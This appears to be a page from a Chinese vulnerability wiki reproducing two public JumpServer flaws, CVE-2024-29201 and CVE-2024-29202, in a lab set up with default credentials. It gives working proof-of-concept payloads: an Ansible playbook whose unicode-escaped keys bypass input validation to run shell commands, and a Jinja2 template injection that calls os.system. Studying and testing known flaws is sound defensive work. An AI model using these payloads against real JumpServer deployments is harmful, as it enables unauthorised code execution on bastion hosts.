<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer/JumpServer%28CVE-2024-29201%29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%26%28CVE-2024-29202%29Jinin2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>JumpServer(CVE 2024 29201)远程代码执行漏洞&(CVE 2024 29202)Jinin2模板注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "JumpServer(CVE-2024-29201)\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u0026amp;(CVE-2024-29202)Jinin2\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
          ]},
          {title: "\u5f71\u54cd\u7248\u672c", url: "#_1", children: [
          ]},
          {title: "\u73af\u5883\u642d\u5efa", url: "#_2", children: [
          ]},
          {title: "CVE-2024-29201", url: "#cve-2024-29201", children: [
          ]},
          {title: "CVE-2024-29202", url: "#cve-2024-29202", children: [
          ]},
          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_3", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../JumpServer%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-42442%EF%BC%89/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../JumpServer%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-42442%EF%BC%89/" class="btn btn-xs btn-link">
        JumpServer存在未授权访问漏洞（CVE-2023-42442）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        JumpServer 未授权接口 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    

    <h2 id="jumpservercve-2024-29201cve-2024-29202jinin2">JumpServer(CVE-2024-29201)远程代码执行漏洞&amp;(CVE-2024-29202)Jinin2模板注入漏洞<a class="headerlink" href="#jumpservercve-2024-29201cve-2024-29202jinin2" title="Permanent link">&para;</a></h2>
<p>JumpServer 是广受欢迎的开源堡垒机，是符合 4A 规范的专业运维安全审计系统。</p>
<p>CVE-2024-29201 远程代码执行漏洞，该漏洞可绕过 JumpServer 的 Ansible 中的输入验证机制，在 Celery 容器中执行任意代码
CVE-2024-29202 Jinin2 模板注入漏洞，该漏洞是有 JumpServer 的 Ansible 中存在 Jinja2 模板注入，在 Celery 容器中执行任意代码。</p>
<h2 id="_1">影响版本<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p><code>v3.0.0 &lt;= JumpServer &lt;= v3.10.6</code></p>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>首先下载官方提供的脚本https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh，下载后编辑 quick_start.sh，将脚本中的 VERSION 修改为存在漏洞版本，如：V3.10.6。如下图所示：</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/8c7db9cf-a5e9-442c-9538-eae5eafd4fcd" /></p>
<p>等待服务启动，启动完成后访问 <a href="http://ip/">http://ip/</a></p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/0e374e28-50ba-4905-a7ea-e8257e33a3ec" /></p>
<p>JumpServer 默认账号密码为 admin/admin</p>
<p>接着进入后台添加资产，具体步骤如下图所示：</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/995bf6d3-1d57-47a1-8194-ec4effdea392" /></p>
<p>添加资产后需要测试是否添加成功，点击资产后面的 更多-测试 进行测试。</p>
<p>资产添加完成后添加用户，如下图所示：</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/808c64ab-2daa-4080-b092-c83cb2426004" /></p>
<p>最后为用户分配一个资产，如下图所示：</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/f0ff0aad-8916-4ef1-800d-46b2f1725bb5" /></p>
<p>至此环境搭建完成。</p>
<h2 id="cve-2024-29201">CVE-2024-29201<a class="headerlink" href="#cve-2024-29201" title="Permanent link">&para;</a></h2>
<p>登陆创建的普通用户账号，进入 作业中心-模板管理 添加一个 Playbook</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/ba8cb7cd-abcd-4a76-92a9-0c5e8e064888" /></p>
<p>点击创建的 Playbook 名称，切换到 工作空间，输入以下内容：</p>
<div class="highlight"><pre><span></span><code>[{
     &quot;name&quot;: &quot;RCE playbook&quot;,
     &quot;hosts&quot;: &quot;all&quot;,
     &quot;tasks&quot;: [
       {
         &quot;name&quot;: &quot;this runs in Celery container&quot;,
         &quot;shell&quot;: &quot;id &gt; /tmp/pwnd&quot;,
         &quot;\u0064elegate_to&quot;: &quot;localhost&quot;
} ],
     &quot;vars&quot;: {
     &quot;ansible_\u0063onnection&quot;: &quot;local&quot;
     }
}]
</code></pre></div>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/b78e8eed-c3a3-46c1-a5d8-ac60d68cb2a6" /></p>
<p>点击保存。保存完成之后切换到 作业管理 页面，创建一个新的 Playbook 作业</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/b22c7efc-22a3-46f9-a275-eec2b3ba1257" /></p>
<p>playbook 作业详情如下：</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/9f727ad1-2f03-497a-8592-42b7f5229561" /></p>
<p>点击保存并运行作业</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/c902efd5-6646-4001-957b-16e414407f75" /></p>
<p>结果如下</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/9169c220-a91d-471f-8bb1-69fd8c4d3fd4" /></p>
<p>进入 Celery 容器，查看 tmp 目录下是否存在 pwnd 文件</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/650bf6b6-d7df-4fb8-9c00-c4d62a37d1d2" /></p>
<h2 id="cve-2024-29202">CVE-2024-29202<a class="headerlink" href="#cve-2024-29202" title="Permanent link">&para;</a></h2>
<p>与 CVE-2024-29201类似，进入 作业中心-模板管理 添加一个 Playbook，在 工作空间 输入的内容为：
<div class="highlight"><pre><span></span><code>- name: |
       {% for x in ().__class__.__base__.__subclasses__() %}
         {% if &quot;warning&quot; in x.__name__ %}
           {{
             x()._module.__builtins__[&quot;__import__&quot;](&quot;os&quot;).system(&quot;id &gt; /tmp/pwnd2&quot;)
           }}
         {%endif%}
       {%endfor%}
</code></pre></div>
添加完成后，同样进入作业管理页面创建并运行 Playbook 作业。运行结果如下</p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/9b2ded4f-2db9-4910-9831-49305e8eef51" /></p>
<p><img alt="image" src="https://github.com/wy876/POC/assets/139549762/d44f6e3d-c9bb-4e5f-9fa8-f636c6210b09" /></p>
<h2 id="_3">漏洞来源<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/">https://wh0am1i.com/2024/03/30/JumpServer-CVE-2024-29201-CVE-2024-29202/</a></li>
<li><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-pjpp-cm9x-6rwj</a></li>
<li><a href="https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch">https://github.com/jumpserver/jumpserver/security/advisories/GHSA-2vvr-vmvx-73ch</a></li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../JumpServer%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-42442%EF%BC%89/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../JumpServer%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2023-42442%EF%BC%89/" class="btn btn-xs btn-link">
        JumpServer存在未授权访问漏洞（CVE-2023-42442）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        JumpServer 未授权接口 远程命令执行漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>